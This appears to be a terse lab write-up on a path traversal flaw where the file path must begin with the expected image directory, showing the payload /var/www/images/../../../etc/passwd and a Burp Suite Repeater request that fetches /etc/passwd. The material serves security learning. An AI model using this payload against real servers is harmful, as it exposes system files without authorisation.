...
Analysis : 
/var/www/images/cat.jpg --> /var/www/images/../../../etc/passwd

Exploit trick : for the absolute start path add dirctory traversal as shown : /var/www/images/../../../etc/passwd
...
Manual PenTest via burpsuite :
    ...
    4. Switch to Repeater tab & manipulate the URL
        ...
        URL : GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2 
